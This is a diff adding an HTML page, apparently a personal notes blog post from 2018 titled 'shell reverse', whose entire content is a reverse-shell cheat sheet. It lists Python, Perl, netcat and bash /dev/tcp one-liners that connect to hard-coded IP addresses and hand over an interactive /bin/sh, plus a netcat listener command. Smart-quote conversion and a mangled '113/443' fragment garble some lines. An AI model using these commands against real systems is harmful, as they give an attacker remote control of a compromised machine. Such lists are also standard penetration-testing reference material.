@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+        <link href="https://fonts.googleapis.com/css?family=Ubuntu" rel="stylesheet">
+
+        <title>shell reverse</title>
+
+        <link rel="stylesheet" href="css/stylesheet.css">
+    </head>
+    <body>
+        <section id="page-title">
+            <h1><a href="/">Notes</a></h1>
+        </section>
+
+
+
+<section class="blog-post">
+    <h1>shell reverse</h1>
+    <div class="blog-post-subheader">
+        December 17, 2018
+    </div>
+    <div class="blog-post-content">
+        <p><code><pre>
+python3 -c &lsquo;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&ldquo;10.10.10.10&rdquo;,443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&ldquo;/bin/sh&rdquo;,&ldquo;-i&rdquo;]);&rsquo;<br />
+perl -e &lsquo;use Socket;$i=&ldquo;10.10.10.10&rdquo;;$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&ldquo;tcp&rdquo;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&ldquo;&gt;&amp;S&rdquo;);open(STDOUT,&ldquo;&gt;&amp;S&rdquo;);open(STDERR,&ldquo;&gt;&amp;S&rdquo;);exec(&ldquo;/bin/sh -i&rdquo;);};&rsquo;<br />
+nc -e /bin/sh 10.0.0.1 1234</p>
+
+<p>#reverse
+bash -i &gt;&amp; /dev/tcp/192.168.100.<sup>113</sup>&frasl;<sub>443</sub> 0&gt;&amp;1<br />
+#listen
+nc -lvp 443</p>
+
+<p>nc -lp 1&gt;/tmp/b</p>
+
+<p></pre></code></p>
+
+    </div>
+</section>
+
+    </body>
+</html>
